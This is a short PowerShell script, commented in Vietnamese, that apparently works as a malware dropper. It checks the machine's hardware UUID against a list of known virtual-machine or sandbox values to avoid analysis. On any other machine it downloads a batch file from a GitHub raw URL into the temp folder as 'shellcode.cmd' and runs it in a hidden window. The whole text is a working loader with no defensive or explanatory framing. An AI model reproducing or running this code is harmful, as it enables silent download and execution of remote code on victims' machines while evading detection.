$UUID = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID

# Danh sách UUID không hợp lệ
$invalidUUIDs = @("03D40274-0435-05DC-8506-010700080009", "03000200-0400-0500-0006-000700080009")

# Kiểm tra nếu UUID không nằm trong danh sách UUID không hợp lệ
if ($invalidUUIDs -notcontains $UUID) {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/skidtoi.bat" -OutFile "$env:Temp\shellcode.cmd"
    Start-Process -FilePath "$env:Temp\shellcode.cmd" -WindowStyle Hidden
}

